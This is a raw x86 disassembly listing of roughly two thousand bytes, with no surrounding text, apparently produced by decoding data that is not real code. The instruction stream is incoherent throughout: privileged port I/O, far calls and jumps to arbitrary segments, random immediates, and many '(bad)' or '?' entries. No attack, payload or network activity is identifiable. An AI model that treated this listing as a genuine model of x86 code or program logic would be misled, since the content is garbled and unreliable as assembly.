  4144b8:	cmp    al,0x78
  4144ba:	or     eax,0x5c89d33
  4144bf:	out    0xe3,al
  4144c1:	into   
  4144c2:	jmp    0x4144d8
  4144c4:	cmp    bl,BYTE PTR [ebx]
  4144c6:	jo     0x41448c
  4144c8:	jge    0x414541
  4144ca:	loope  0x414455
  4144cc:	mov    edi,DWORD PTR [edi+0x115caf11]
  4144d2:	stos   DWORD PTR es:[edi],eax
  4144d3:	push   eax
  4144d4:	arpl   di,sp
  4144d6:	ins    DWORD PTR es:[edi],dx
  4144d7:	sbb    BYTE PTR [ebx],0x6
  4144da:	repz push esp
  4144dc:	pop    ds
  4144dd:	shl    DWORD PTR [ecx],cl
  4144df:	sub    esi,ebx
  4144e1:	cs (bad) 
  4144e3:	add    dl,BYTE PTR [ebp-0x39]
  4144e6:	jecxz  0x414557
  4144e8:	lahf   
  4144e9:	or     eax,0x2fae473e
  4144ee:	xlat   BYTE PTR ds:[ebx]
  4144ef:	xchg   edi,eax
  4144f0:	retf   
  4144f1:	dec    ebp
  4144f2:	push   ss
  4144f3:	inc    ebp
  4144f4:	push   es
  4144f5:	rcl    BYTE PTR [ebp+0x3c],1
  4144f8:	sub    al,0xfb
  4144fa:	dec    esi
  4144fb:	es mov esp,ss
  4144fe:	inc    ecx
  4144ff:	out    0x48,al
  414501:	mov    dh,0x65
  414503:	cmp    edi,ebp
  414505:	pop    ss
  414506:	call   0xfd06:0x26c80c55
  41450d:	repnz dec edi
  41450f:	hlt    
  414510:	retf   
  414511:	xchg   edi,eax
  414512:	int3   
  414513:	cmc    
  414514:	out    dx,al
  414515:	push   edi
  414516:	das    
  414517:	sub    dl,dh
  414519:	push   esp
  41451a:	jb     0x4144c2
  41451c:	jb     0x414564
  41451e:	pop    eax
  41451f:	inc    edx
  414520:	fdiv   DWORD PTR [ebp+0x45]
  414523:	add    al,0xc8
  414525:	outs   dx,BYTE PTR ds:[esi]
  414527:	mov    ?,eax
  414529:	leave  
  41452a:	inc    bh
  41452c:	push   ebx
  41452d:	cld    
  41452e:	mov    dl,0xd9
  414530:	adc    al,BYTE PTR [esi-0x5f]
  414533:	out    dx,eax
  414534:	cmc    
  414535:	push   esp
  414536:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414537:	push   ebp
  414538:	add    eax,0xafdbb29c
  41453d:	or     al,0x91
  41453f:	sbb    eax,0xf67f7a83
  414544:	jecxz  0x414561
  414546:	xlat   BYTE PTR ds:[ebx]
  414547:	xchg   esi,eax
  414548:	dec    ebx
  414549:	jp     0x4145b2
  41454b:	outs   dx,DWORD PTR ds:[esi]
  41454c:	sahf   
  41454d:	xor    bl,BYTE PTR [eax+0x483e6bf9]
  414553:	inc    esp
  414554:	fisubr WORD PTR [edi-0x7]
  414557:	jp     0x41458a
  414559:	sbb    BYTE PTR [esi+0x4d],ah
  41455c:	in     al,dx
  41455d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41455e:	pop    eax
  41455f:	mov    bh,0x98
  414561:	shl    BYTE PTR [eax+0x64cd779e],0x5b
  414568:	les    edi,FWORD PTR [ebx]
  41456a:	in     al,0xb9
  41456c:	dec    edx
  41456d:	rcl    DWORD PTR [ecx+0x243a144e],0x16
  414574:	and    al,0x21
  414576:	fisubr WORD PTR [edi-0x2957132f]
  41457c:	fisub  WORD PTR [esi+0x754973f1]
  414582:	mov    bh,0x3f
  414584:	mov    DWORD PTR [ecx-0x6],ecx
  414587:	dec    ecx
  414588:	jl     0x4145e0
  41458a:	jbe    0x41455a
  41458c:	shr    DWORD PTR [ebx],1
  41458e:	mov    ebx,ebp
  414590:	pop    ds
  414591:	test   eax,0x8e8f5e10
  414596:	das    
  414597:	mov    ch,al
  414599:	leave  
  41459a:	push   es
  41459b:	cli    
  41459c:	push   cs
  41459d:	leave  
  41459e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41459f:	outs   dx,BYTE PTR ds:[esi]
  4145a0:	dec    esi
  4145a1:	ins    BYTE PTR es:[edi],dx
  4145a2:	sbb    al,0x7e
  4145a4:	out    0x7f,al
  4145a6:	pusha  
  4145a7:	test   DWORD PTR [edi-0x5],edx
  4145aa:	cdq    
  4145ab:	enter  0x63ce,0x41
  4145af:	push   ds
  4145b0:	xor    al,0x69
  4145b2:	and    edi,DWORD PTR [ebp+0x6b]
  4145b5:	xor    esi,DWORD PTR [ebp-0x6092de6a]
  4145bb:	cwde   
  4145bc:	adc    DWORD PTR [esi+0x7f5af83a],esp
  4145c2:	int3   
  4145c3:	inc    ebx
  4145c4:	adc    eax,0x9f408486
  4145c9:	in     eax,dx
  4145ca:	add    DWORD PTR ds:0x844382b0,edi
  4145d0:	add    edx,ebx
  4145d2:	sbb    BYTE PTR [edx+eiz*8+0x4f0dcf09],0xfe
  4145da:	in     al,dx
  4145db:	enter  0x79e2,0x50
  4145df:	fld    DWORD PTR [edx-0x3be4a32c]
  4145e5:	sbb    bh,BYTE PTR [ebp-0x14b465b9]
  4145eb:	dec    eax
  4145ec:	into   
  4145ed:	(bad)  
  4145ee:	push   esi
  4145ef:	js     0x414651
  4145f1:	stos   DWORD PTR es:[edi],eax
  4145f2:	jge    0x4145fb
  4145f4:	jnp    0x414593
  4145f6:	pop    esp
  4145f7:	dec    esp
  4145f8:	dec    edx
  4145f9:	push   ss
  4145fa:	dec    esi
  4145fb:	jmp    0x414627
  4145fd:	jno    0x4145ed
  4145ff:	arpl   WORD PTR [esi-0x5b9d74ea],ax
  414605:	push   0xc
  414607:	or     ebp,0x84e3b3f1
  41460d:	jae    0x41463c
  41460f:	test   DWORD PTR [esi-0x253775d2],ebx
  414615:	cwde   
  414616:	arpl   bp,si
  414618:	mov    eax,0x8011784
  41461d:	or     eax,0xcefd51c3
  414622:	aam    0xa8
  414624:	repz sub al,BYTE PTR [esi-0xf027c4]
  41462b:	and    edx,edx
  41462d:	(bad)  
  41462e:	dec    esp
  41462f:	mov    eax,0xe0b7bfe6
  414634:	scas   eax,DWORD PTR es:[edi]
  414635:	inc    ecx
  414636:	loop   0x414602
  414638:	xchg   ebx,eax
  414639:	test   BYTE PTR [edx-0x54],ah
  41463c:	mov    al,0x8
  41463e:	fisubr WORD PTR [ecx-0x5cf67ee7]
  414644:	push   esp
  414645:	test   DWORD PTR [ebp-0x28b17134],0xeef8c4db
  41464f:	scas   al,BYTE PTR es:[edi]
  414650:	sbb    esi,DWORD PTR [ebp+0x41e93ff0]
  414656:	xor    BYTE PTR es:[edx],al
  414659:	jmp    0x414667
  41465b:	sub    edx,DWORD PTR ds:0x538c7ea
  414661:	or     ch,BYTE PTR [eax-0x50]
  414664:	pop    esi
  414665:	xor    DWORD PTR [ebx+ebp*1],0x25f135ae
  41466c:	addr16 inc ecx
  41466e:	mov    bl,0x46
  414670:	out    0x1a,eax
  414672:	leave  
  414673:	stc    
  414674:	push   cs
  414675:	xchg   DWORD PTR [eax+0x7f],ebp
  414678:	in     eax,dx
  414679:	out    dx,al
  41467a:	xchg   esp,eax
  41467b:	fstp   DWORD PTR [esi-0x2a]
  41467e:	push   ss
  41467f:	fadd   st,st(0)
  414681:	sbb    DWORD PTR [edx+0x308d8b2f],eax
  414687:	and    esi,esp
  414689:	out    0x1d,al
  41468b:	cmc    
  41468c:	ja     0x4146d3
  41468e:	mov    edi,0x659108ff
  414693:	jge    0x41469e
  414695:	imul   ecx,DWORD PTR [edx],0xffffffb1
  414698:	aad    0x71
  41469a:	pop    edx
  41469b:	(bad)
  41469e:	call   0xc22:0x6a28890c
  4146a5:	nop
  4146a6:	daa    
  4146a7:	icebp  
  4146a8:	fbld   TBYTE PTR [eax+ebp*4+0xf]
  4146ac:	pop    edi
  4146ad:	dec    edx
  4146ae:	repnz cwde 
  4146b0:	dec    edx
  4146b1:	int    0x8e
  4146b3:	lods   eax,DWORD PTR ds:[esi]
  4146b4:	dec    esp
  4146b5:	dec    eax
  4146b6:	lods   al,BYTE PTR ds:[esi]
  4146b7:	mov    edx,0x929f1cf7
  4146bc:	or     BYTE PTR [ebp+0x5f],0x85
  4146c0:	daa    
  4146c1:	xor    DWORD PTR [eax],ebx
  4146c3:	imul   eax,esi,0xffffff98
  4146c6:	push   cs
  4146c7:	dec    edx
  4146c8:	jb     0x4146ec
  4146ca:	mov    ch,0x5f
  4146cc:	jmp    0x4146f7
  4146ce:	jbe    0x41471c
  4146d0:	loop   0x414652
  4146d2:	es mov eax,0xcce9ab50
  4146d8:	pushf  
  4146d9:	retf   0x906e
  4146dc:	lea    eax,[edi+ebp*1+0x61d2958a]
  4146e3:	add    DWORD PTR [edx],edx
  4146e5:	(bad)  
  4146e6:	(bad)  
  4146e7:	cmp    eax,DWORD PTR [edx-0x36a1f225]
  4146ed:	xchg   ebx,eax
  4146ee:	ret    0x3648
  4146f1:	mov    bh,0xef
  4146f3:	mov    edi,eax
  4146f5:	push   ebp
  4146f6:	or     bl,BYTE PTR cs:[ebx]
  4146f9:	pop    es
  4146fa:	or     edx,ebx
  4146fc:	js     0x414744
  4146fe:	aas    
  4146ff:	int3   
  414700:	ss mov esp,0xcc6c97e9
  414706:	out    dx,al
  414707:	(bad)  
  414708:	mov    dl,0x67
  41470a:	lods   eax,DWORD PTR ds:[esi]
  41470b:	and    DWORD PTR [ebp-0x29c031a1],0xfffffff6
  414712:	mov    ah,0xbc
  414714:	adc    al,0xb5
  414716:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414717:	push   esi
  414718:	lea    ecx,[ebp+0x42]
  41471b:	cmp    DWORD PTR [ecx],edx
  41471d:	int    0xed
  41471f:	cli    
  414720:	jae    0x4146ea
  414722:	jne    0x4146e6
  414724:	ret    0x579a
  414727:	jg     0x4147a2
  414729:	add    eax,0xadc96874
  41472e:	add    eax,0x97c316e
  414733:	push   ebx
  414734:	in     ax,0xde
  414737:	gs inc eax
  414739:	mov    eax,0x4a8b2d8a
  41473e:	repz xor eax,0x97d5910e
  414744:	lock fs das 
  414747:	mov    ds:0x1500a69d,eax
  41474c:	add    eax,0x6da499df
  414751:	or     edi,DWORD PTR [edx-0x38]
  414754:	test   al,0x22
  414756:	ret    0xf2bb
  414759:	icebp  
  41475a:	inc    edi
  41475b:	xor    DWORD PTR [edx+ebp*2+0x3173c61b],esi
  414762:	retf   0x77ae
  414765:	je     0x414795
  414767:	nop
  414768:	rcr    BYTE PTR [eax-0x34],0x1d
  41476c:	xor    al,0xbd
  41476e:	arpl   WORD PTR [edx-0x70],dx
  414771:	lea    esp,[esi+0x59e763d]
  414777:	pop    ebp
  414778:	pop    eax
  414779:	fwait
  41477a:	sub    esp,DWORD PTR [ebp-0x63e4d6d8]
  414780:	lock mov DWORD PTR [edi+0x54],eax
  414784:	iret   
  414785:	sbb    edi,DWORD PTR [edx]
  414787:	and    ecx,DWORD PTR [ebp-0x36]
  41478a:	fiadd  DWORD PTR [edi]
  41478c:	push   ebx
  41478d:	pop    ecx
  41478e:	xchg   BYTE PTR [ebp-0x73],ah
  414791:	(bad)  
  414792:	sub    esi,eax
  414794:	icebp  
  414795:	mov    bh,bh
  414797:	inc    eax
  414798:	shl    BYTE PTR [edi],1
  41479a:	iret   
  41479b:	outs   dx,DWORD PTR ds:[esi]
  41479c:	idiv   bh
  41479e:	inc    esi
  41479f:	scas   eax,DWORD PTR es:[edi]
  4147a0:	es cwde 
  4147a2:	and    ch,BYTE PTR [esi+edi*1]
  4147a5:	bound  ebp,QWORD PTR [esi+esi*2+0x6e]
  4147a9:	inc    ecx
  4147aa:	inc    edi
  4147ab:	dec    ecx
  4147ac:	xchg   ebx,eax
  4147ad:	in     al,dx
  4147ae:	ds push edx
  4147b0:	test   DWORD PTR [ebp+edi*2+0x5df6b49f],edx
  4147b7:	xor    al,0x51
  4147b9:	fimul  WORD PTR [esi]
  4147bb:	mov    DWORD PTR [esp+edx*8+0xb5889d5],edi
  4147c2:	stc    
  4147c3:	cld    
  4147c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147c5:	pop    es
  4147c6:	shl    ebp,1
  4147c8:	push   ss
  4147c9:	push   edi
  4147ca:	arpl   WORD PTR [edx],bx
  4147cc:	dec    edi
  4147cd:	push   edx
  4147ce:	sbb    BYTE PTR [ecx-0x19],0xac
  4147d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147d3:	mov    ebp,0x24c25071
  4147d8:	sub    cl,cl
  4147da:	sti    
  4147db:	iret   
  4147dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147dd:	leave  
  4147de:	stc    
  4147df:	pop    edi
  4147e0:	ret    
  4147e1:	sub    eax,0x59c3f3c5
  4147e6:	loope  0x414852
  4147e8:	push   ecx
  4147e9:	pop    edi
  4147ea:	je     0x41480e
  4147ec:	mov    ds:0xa4e7b1d9,eax
  4147f1:	jp     0x41478f
  4147f3:	cmp    ch,BYTE PTR [ecx+0x600e70d1]
  4147f9:	dec    ecx
  4147fa:	cmp    al,0x86
  4147fc:	dec    eax
  4147fd:	mov    esp,edx
  4147ff:	push   ds
  414800:	sub    esp,edi
  414802:	iret   
  414803:	mov    esp,ds
  414805:	gs out 0x10,eax
  414808:	mov    dh,0x56
  41480a:	mov    esi,0xb0f0353b
  41480f:	mov    esi,0x45b6d793
  414814:	xchg   esi,eax
  414815:	int    0x42
  414817:	pop    ss
  414818:	sub    eax,esp
  41481a:	jb     0x414874
  41481c:	popf   
  41481d:	and    al,0x4b
  41481f:	mov    esp,0xf36f6c12
  414824:	popf   
  414825:	add    bh,BYTE PTR [ebp-0x2e]
  414828:	cmp    ah,dh
  41482a:	fwait
  41482b:	inc    ecx
  41482c:	popf   
  41482d:	out    dx,al
  41482e:	sbb    ebx,DWORD PTR [edx]
  414830:	cmp    eax,0xbd0912a0
  414835:	or     dl,dl
  414837:	dec    esi
  414838:	push   esp
  414839:	mov    esp,0xdc08dc02
  41483e:	mov    bh,0xbf
  414840:	adc    BYTE PTR [ebx],dl
  414842:	xlat   BYTE PTR gs:[ebx]
  414844:	in     al,0x52
  414846:	sub    DWORD PTR [ebx+0x57878ec9],0x4fe142e3
  414850:	push   esp
  414851:	mov    ?,WORD PTR [ebp-0x51]
  414854:	and    eax,0x384a51ee
  414859:	push   eax
  41485a:	push   eax
  41485b:	jg     0x4148a6
  41485d:	hlt    
  41485e:	(bad)  
  41485f:	test   al,0xbf
  414861:	or     BYTE PTR [edx+0x5fc2200c],cl
  414867:	(bad)  [edx-0x6d]
  41486a:	push   es
  41486b:	imul   ecx,DWORD PTR ds:0x32a1a723,0x79
  414872:	sub    DWORD PTR [ebp-0x3cff28a2],esi
  414878:	inc    esi
  414879:	add    DWORD PTR [edx+0x5],eax
  41487c:	not    DWORD PTR [ebx+edi*4]
  41487f:	adc    BYTE PTR [ecx],0xaf
  414882:	gs inc ecx
  414884:	pop    edi
  414886:	out    0x34,al
  414888:	hlt    
  414889:	rol    DWORD PTR [edi],1
  41488b:	mov    bl,0xe1
  41488d:	in     al,0x3b
  41488f:	jmp    0x414896
  414891:	test   BYTE PTR [edi-0x74],dh
  414894:	mov    edx,0x6f652de
  414899:	rol    DWORD PTR [eax],cl
  41489b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41489c:	mov    dh,0x97
  41489e:	pusha  
  41489f:	sbb    eax,0x343236d5
  4148a4:	cmp    esp,DWORD PTR [ebx-0x3e]
  4148a7:	jo     0x414864
  4148a9:	or     dl,BYTE PTR [edi-0x57f0a81b]
  4148af:	iret   
  4148b0:	jne    0x4148eb
  4148b2:	in     al,0x69
  4148b4:	xchg   DWORD PTR [ebp+0x73044f2a],edi
  4148ba:	jmp    0x414915
  4148bc:	(bad)  
  4148bd:	sub    al,0xb
  4148bf:	pop    eax
  4148c0:	push   ebp
  4148c1:	scas   eax,DWORD PTR es:[edi]
  4148c2:	xor    al,0x2d
  4148c4:	jmp    0xffde4529
  4148c9:	pop    edx
  4148ca:	adc    ah,BYTE PTR [edi]
  4148cc:	sub    al,0xe7
  4148ce:	cmp    bl,cl
  4148d0:	test   al,0x27
  4148d2:	jb     0x4148b3
  4148d4:	test   BYTE PTR [ebx-0x310df45b],0x3b
  4148db:	lds    esp,FWORD PTR [ecx+ecx*1-0x24f0f565]
  4148e2:	inc    esp
  4148e3:	call   FWORD PTR [ecx-0xd8d3e0f]
  4148e9:	push   edx
  4148ea:	add    eax,0x5f73bb17
  4148ef:	ins    DWORD PTR es:[edi],dx
  4148f0:	sub    bh,BYTE PTR [esi]
  4148f2:	das    
  4148f3:	mov    ch,0x7a
  4148f5:	pop    es
  4148f6:	dec    edi
  4148f7:	cmp    ch,BYTE PTR [ebx]
  4148f9:	sub    eax,0xa3fef81d
  4148fe:	call   0xe910:0x9ac2c4ac
  414905:	mov    al,ds:0x11a39249
  41490a:	rcl    esi,0xa0
  41490d:	cmp    ch,dh
  41490f:	aaa    
  414910:	xchg   esp,eax
  414911:	inc    esi
  414912:	outs   dx,DWORD PTR ds:[esi]
  414913:	clc    
  414914:	in     al,dx
  414915:	popf   
  414916:	pop    ss
  414917:	xchg   edx,eax
  414918:	xchg   edx,eax
  414919:	sahf   
  41491a:	ja     0x4148e5
  41491c:	popa   
  41491d:	dec    eax
  41491e:	and    BYTE PTR [edx+0x307d7108],bh
  414924:	inc    ebp
  414925:	mov    edx,0xd3171934
  41492a:	inc    ebp
  41492b:	pop    edi
  41492c:	call   0x6e02:0x44555265
  414933:	dec    ebp
  414934:	pop    esi
  414935:	scas   al,BYTE PTR es:[edi]
  414936:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414937:	fsubr  st(0),st
  414939:	push   ebp
  41493a:	cwde   
  41493b:	sub    eax,0x755a00a7
  414940:	test   DWORD PTR [esi+0x28],eax
  414943:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  414945:	fisttp QWORD PTR [ecx-0x26]
  414948:	and    esi,ebp
  41494a:	shl    DWORD PTR [ecx],1
  41494c:	rcr    BYTE PTR [ebx],1
  41494e:	push   cs
  41494f:	aad    0x82
  414951:	ret    0xc633
  414954:	retf   0x22a6
  414957:	les    edx,FWORD PTR [edi+ebp*8+0x36]
  41495b:	call   0xa79e6cf7
  414960:	dec    esp
  414961:	daa    
  414962:	aam    0x6e
  414964:	xchg   bl,cl
  414966:	aas    
  414967:	cmp    dh,BYTE PTR [edi+0x1a]
  41496a:	pop    edx
  41496b:	jne    0x4149c8
  41496d:	or     DWORD PTR ds:[ebx],edi
  414970:	or     ebp,DWORD PTR [bx-0x6194]
  414975:	shl    BYTE PTR [esi+0x3c],cl
  414978:	push   ebp
  414979:	mov    ebx,0xb67def1e
  41497e:	int3   
  41497f:	push   0xffffffb8
  414981:	idiv   DWORD PTR [edi]
  414983:	fmulp  st(1),st
  414985:	scas   eax,DWORD PTR es:[edi]
  414986:	mov    WORD PTR [eax-0x4],ds
  414989:	sbb    DWORD PTR [eax],ecx
  41498b:	jne    0x414929
  41498d:	and    al,0xeb
  41498f:	test   dh,dh
  414991:	stos   BYTE PTR es:[edi],al
  414992:	clc    
  414993:	dec    esp
  414994:	push   edx
  414995:	ds sub ebp,esi
  414998:	ins    DWORD PTR es:[edi],dx
  414999:	(bad)  
  41499a:	out    0x21,al
  41499c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41499d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41499e:	push   edi
  41499f:	and    ch,bl
  4149a1:	add    DWORD PTR [eax+0xe],0x570d0105
  4149a8:	cmp    BYTE PTR [edi+0x47b7a711],0x37
  4149af:	adc    BYTE PTR [eax+0x72],dh
  4149b2:	jb     0x4149f3
  4149b4:	jb     0x414955
  4149b6:	push   0x57c48a3e
  4149bb:	push   es
  4149bc:	ret    
  4149bd:	jo     0x414978
  4149bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149c0:	add    esp,esi
  4149c2:	lods   al,BYTE PTR ds:[esi]
  4149c3:	not    DWORD PTR [ecx-0x60]
  4149c6:	jp     0x4149b8
  4149c8:	sub    ebp,DWORD PTR [esi]
  4149ca:	adc    DWORD PTR [ecx+eax*2],0x869c54ca
  4149d1:	fdivr  st,st(0)
  4149d3:	ret    
  4149d4:	mov    ?,WORD PTR [ebp+0x5e]
  4149d7:	jb     0x4149d8
  4149d9:	sub    eax,0xf3a59d65
  4149de:	repnz add BYTE PTR [ebp+0x56],cl
  4149e2:	xor    edx,DWORD PTR [ebx+0x6046bc88]
  4149e8:	arpl   WORD PTR [ebx+esi*4+0x1afc71a6],bx
  4149ef:	mov    cl,0x46
  4149f1:	dec    esi
  4149f2:	add    BYTE PTR [edx+edx*2],0x8d
  4149f6:	dec    edx
  4149f7:	xor    BYTE PTR [esp+ebp*8],0x65
  4149fb:	sbb    dh,BYTE PTR [esi]
  4149fd:	adc    DWORD PTR [ebx],esp
  4149ff:	and    esp,DWORD PTR [esi-0x597f3610]
  414a05:	pop    edx
  414a06:	xbegin 0x27cf9bee
  414a0c:	cmp    bh,dh
  414a0e:	sub    edx,DWORD PTR [ebp+0x4d]
  414a11:	xor    edx,DWORD PTR [edi-0x1c0a3e7a]
  414a17:	push   edi
  414a18:	scas   al,BYTE PTR es:[edi]
  414a19:	ja     0x4149a5
  414a1b:	sahf   
  414a1c:	stos   BYTE PTR es:[edi],al
  414a1d:	add    bh,BYTE PTR [edi]
  414a1f:	pop    ebx
  414a20:	adc    dl,BYTE PTR [ecx-0x7d]
  414a23:	stos   DWORD PTR es:[edi],eax
  414a24:	add    BYTE PTR [ebx+esi*1-0x7c45128c],bl
  414a2b:	aas    
  414a2c:	cmp    bh,al
  414a2e:	dec    ebp
  414a2f:	jmp    0x6d5c330
  414a34:	pop    edx
  414a35:	mov    ds:0x737b4cb8,eax
  414a3a:	fs test al,0x9d
  414a3d:	fisubr DWORD PTR [esi]
  414a3f:	dec    edx
  414a40:	imul   esp,DWORD PTR [eax-0x707d2ae9],0xec85d5a7
  414a4a:	jae    0x4149e0
  414a4c:	jno    0x414a6e
  414a4e:	jmp    0x8091:0x75348ebe
  414a55:	sar    BYTE PTR [edx+0x77],1
  414a58:	nop
  414a59:	mov    esi,DWORD PTR [edx+0x475cb7f4]
  414a5f:	mov    eax,ds:0xb5b48ad4
  414a64:	shr    BYTE PTR [ebp+0x73a24817],1
  414a6a:	jnp    0x414aa3
  414a6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a6d:	mov    eax,ds:0x563ceed
  414a72:	add    DWORD PTR [edi+ebp*4],eax
  414a75:	mov    al,0x71
  414a77:	mov    al,ds:0xc2e36410
  414a7c:	mov    bh,BYTE PTR [edi-0x573f6739]
  414a82:	icebp  
  414a83:	inc    ebp
  414a84:	pop    esp
  414a85:	rcl    DWORD PTR ds:0xe6020271,0x5e
  414a8c:	or     bh,dh
  414a8e:	into   
  414a8f:	test   al,0xe3
  414a91:	sbb    DWORD PTR [edx-0x6b],ebx
  414a94:	sub    DWORD PTR [ecx],ecx
  414a96:	cld    
  414a97:	push   0x7
  414a99:	or     al,0x3c
  414a9b:	test   al,0xee
  414a9d:	sub    al,0x25
  414a9f:	(bad)  
  414aa0:	xchg   edx,eax
  414aa1:	jo     0x414acc
  414aa3:	pop    esp
  414aa4:	arpl   WORD PTR [edx+0x7c21b233],bp
  414aaa:	stos   DWORD PTR es:[edi],eax
  414aab:	push   ss
  414aac:	imul   esp
  414aae:	dec    eax
  414aaf:	jl     0x414a7f
  414ab1:	mov    al,BYTE PTR [ecx-0x2277e2c8]
  414ab7:	mov    cl,0x31
  414ab9:	cmp    ecx,ebp
  414abb:	scas   eax,DWORD PTR es:[edi]
  414abc:	sub    eax,0x4585516f
  414ac1:	inc    eax
  414ac2:	ret    
  414ac3:	mov    esp,edi
  414ac5:	cmp    al,0xb8
  414ac7:	lods   al,BYTE PTR ds:[esi]
  414ac8:	lods   al,BYTE PTR ds:[esi]
  414ac9:	mov    edi,0xf4af9f2f
  414ace:	test   DWORD PTR [ebx+edi*4-0x7],esp
  414ad2:	mov    ds:0x1cbb852c,eax
  414ad7:	xor    DWORD PTR [eax+edx*2-0x73],eax
  414adb:	pop    ebp
  414adc:	fld    DWORD PTR [eax-0x66433242]
  414ae2:	repnz push edi
  414ae4:	mov    dl,0x27
  414ae6:	loopne 0x414aec
  414ae8:	cmp    DWORD PTR [ebx-0x68],esp
  414aeb:	add    al,0x4a
  414aed:	(bad)  
  414aee:	mov    cl,0xd4
  414af0:	dec    eax
  414af1:	fimul  WORD PTR [edx-0x676a7db4]
  414af7:	leave  
  414af8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414af9:	push   esi
  414afa:	jle    0x414afd
  414afc:	popa   
  414afd:	(bad)  
  414afe:	xchg   edx,eax
  414aff:	adc    al,0xa
  414b01:	or     eax,0x5533ba9e
  414b06:	jmp    0xecb758c7
  414b0b:	ins    BYTE PTR es:[edi],dx
  414b0c:	mov    ebx,0x17cbfebe
  414b11:	sti    
  414b12:	sbb    DWORD PTR [eax+0x2d63b0d9],edx
  414b18:	icebp  
  414b19:	sti    
  414b1a:	stos   BYTE PTR es:[edi],al
  414b1b:	push   ss
  414b1c:	sub    DWORD PTR [ebx+ebp*4+0x75],esi
  414b20:	je     0x414b16
  414b22:	ins    BYTE PTR es:[edi],dx
  414b23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b24:	repz push ss
  414b26:	mov    ah,BYTE PTR [edi]
  414b28:	inc    esi
  414b29:	jmp    0xcaee:0x74b441aa
  414b30:	adc    eax,0x48dec459
  414b35:	lahf   
  414b36:	fcomp  st(7)
  414b38:	cmp    eax,0x7fe50974
  414b3d:	xchg   DWORD PTR [ebx],esi
  414b3f:	jle    0x414ba5
  414b41:	(bad)  [esi+eiz*1]
  414b44:	aas    
  414b45:	lods   eax,DWORD PTR ds:[esi]
  414b46:	lds    ebx,FWORD PTR [edi]
  414b48:	imul   ecx,DWORD PTR [edi+0x17],0xdd3afec9
  414b4f:	inc    ecx
  414b50:	rcr    BYTE PTR [edx+0x2845f78c],0x5f
  414b57:	xchg   edx,eax
  414b58:	jbe    0x414ae9
  414b5a:	inc    ebx
  414b5b:	lds    ebp,FWORD PTR [ecx-0x20a37f68]
  414b61:	arpl   WORD PTR [esp+ebx*4],ax
  414b64:	repnz inc ecx
  414b66:	aad    0xb9
  414b68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b69:	ret    
  414b6a:	jb     0x414bc7
  414b6c:	jns    0x414ba0
  414b6e:	repnz sub ecx,esi
  414b71:	mov    ds:0x53b38204,al
  414b76:	aaa    
  414b77:	js     0x414b19
  414b79:	fcomp  QWORD PTR [ecx+0x14]
  414b7c:	jb     0x414bc5
  414b7e:	scas   eax,DWORD PTR es:[edi]
  414b7f:	imul   eax,DWORD PTR [ecx],0xffffffb2
  414b82:	stos   DWORD PTR es:[edi],eax
  414b83:	jmp    0x414b0d
  414b85:	rcl    DWORD PTR [edi+0x1431d79b],1
  414b8b:	or     BYTE PTR [edx-0x11],al
  414b8e:	xchg   esp,eax
  414b8f:	imul   ecx,DWORD PTR ds:0x1c356b32,0x5b
  414b96:	shl    BYTE PTR [ecx*1+0x3ac52e65],cl
  414b9d:	fcomp  DWORD PTR [edx]
  414b9f:	(bad)  
  414ba0:	inc    ebp
  414ba1:	or     ah,cl
  414ba3:	in     eax,dx
  414ba4:	jb     0x414c07
  414ba6:	addr16 pop ecx
  414ba8:	ret    
  414ba9:	in     al,0xde
  414bab:	xchg   edx,eax
  414bac:	sti    
  414bad:	daa    
  414bae:	jo     0x414ba5
  414bb0:	imul   esi,DWORD PTR [ebx],0x40
  414bb3:	jge    0x414bb8
  414bb5:	dec    ecx
  414bb6:	dec    edx
  414bb7:	fistp  DWORD PTR [ebx]
  414bb9:	dec    eax
  414bba:	or     cl,ch
  414bbc:	test   eax,0x332cb1d3
  414bc1:	lahf   
  414bc2:	pop    esi
  414bc3:	arpl   WORD PTR [ebp+eax*2+0x13],bx
  414bc7:	dec    ebx
  414bc8:	mov    ?,WORD PTR ds:[esi+0x3d]
  414bcc:	mov    WORD PTR [ebx-0x41dc8302],ss
  414bd2:	mov    eax,0xd367425a
  414bd7:	and    eax,esi
  414bd9:	inc    edx
  414bda:	stc    
  414bdb:	sub    al,0x47
  414bdd:	enter  0xef22,0x1d
  414be1:	cmc    
  414be2:	add    eax,0xf826cb7
  414be7:	inc    esp
  414be8:	popf   
  414be9:	and    BYTE PTR [ebx-0x1b],0x90
  414bed:	or     eax,DWORD PTR [ecx-0x14671945]
  414bf3:	mov    dl,0xe7
  414bf5:	dec    edi
  414bf6:	test   eax,0xbeaa4188
  414bfb:	mov    ecx,0xbc53cc83
  414c00:	rcl    eax,0x4a
  414c03:	lahf   
  414c04:	sbb    BYTE PTR [edi-0x5],0xe5
  414c08:	xchg   esi,eax
  414c09:	mov    BYTE PTR [eax],al
  414c0b:	sahf   
  414c0c:	(bad)  
  414c0d:	and    al,0x6c
  414c0f:	xor    BYTE PTR [edx-0x1a34709a],bh
  414c15:	stos   BYTE PTR es:[edi],al
  414c16:	mov    al,0x5c
  414c18:	sahf   
  414c19:	mov    esi,0x82b67fa0
  414c1e:	in     al,dx
  414c1f:	cmp    esp,esp
  414c21:	pop    edx
  414c22:	xchg   ebp,eax
  414c23:	push   0xe5be3ef8
  414c28:	fidivr DWORD PTR [eax]
  414c2a:	xor    al,0x17
  414c2c:	adc    DWORD PTR es:[edx-0x4b910317],edx
  414c33:	imul   ecx,DWORD PTR [ebx+edi*4-0x5],0x21e3ce93
  414c3b:	sbb    eax,0x10db0c31
  414c40:	rol    DWORD PTR [edi-0x15],1
  414c43:	inc    ecx
  414c44:	inc    eax
